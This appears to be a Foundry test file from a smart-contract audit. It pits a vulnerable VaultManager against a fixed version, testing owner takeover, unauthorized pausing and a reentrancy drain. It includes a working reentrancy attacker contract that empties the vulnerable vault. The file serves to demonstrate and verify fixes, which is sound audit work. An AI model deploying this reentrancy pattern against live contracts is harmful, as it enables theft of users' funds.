// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";
import {VaultManager} from "../src/VaultManager.sol";
import {VaultManagerFixed} from "../src/VaultManagerFixed.sol";

contract AuditTest is Test {
    VaultManager vul;
    VaultManagerFixed fix;

    function setUp() public {
        vul = new VaultManager();
        fix = new VaultManagerFixed();
        vul.deposit{value: 5 ether}();
        fix.deposit{value: 5 ether}();
    }

    function test_H01_Takeover() public {
        address atk = makeAddr("atk");
        vm.prank(atk); vul.setOwner(atk);
        assertEq(vul.owner(), atk);
        vm.prank(atk);
        vm.expectRevert(bytes("owner"));
        fix.setOwner(atk);
    }

    function test_H02_Reentrancy() public {
        AuditAttacker atk = new AuditAttacker(address(vul));
        atk.attack{value: 1 ether}();
        assertEq(address(vul).balance, 0);
        assertGe(address(atk).balance, 5 ether);
    }

    function test_FixedResiste() public {
        FixAttacker atk = new FixAttacker(address(fix));
        // Con CEI el balance ya es 0 en el receive → no reentra; el atacante solo recupera lo suyo.
        atk.attack{value: 1 ether}();
        assertEq(address(fix).balance, 5 ether); // fondos de la víctima intactos
        assertEq(address(atk).balance, 1 ether);  // solo su depósito
    }

    function test_M01_Pause() public {
        vm.prank(makeAddr("x")); vul.setPaused(true);
        vm.expectRevert(bytes("paused"));
        vul.withdraw(1 ether);
        vm.prank(makeAddr("x"));
        vm.expectRevert(bytes("owner"));
        fix.setPaused(true);
    }
}

contract AuditAttacker {
    VaultManager v;
    constructor(address v_) { v = VaultManager(v_); }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw(msg.value);
    }
    receive() external payable {
        if (address(v).balance > 0) {
            v.withdraw(v.balances(address(this)));
        }
    }
}
contract FixAttacker {
    VaultManagerFixed v;
    constructor(address v_) { v = VaultManagerFixed(v_); }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw(msg.value);
    }
    receive() external payable {
        if (address(v).balance > 0 && v.balances(address(this)) > 0) {
            v.withdraw(v.balances(address(this)));
        }
    }
}
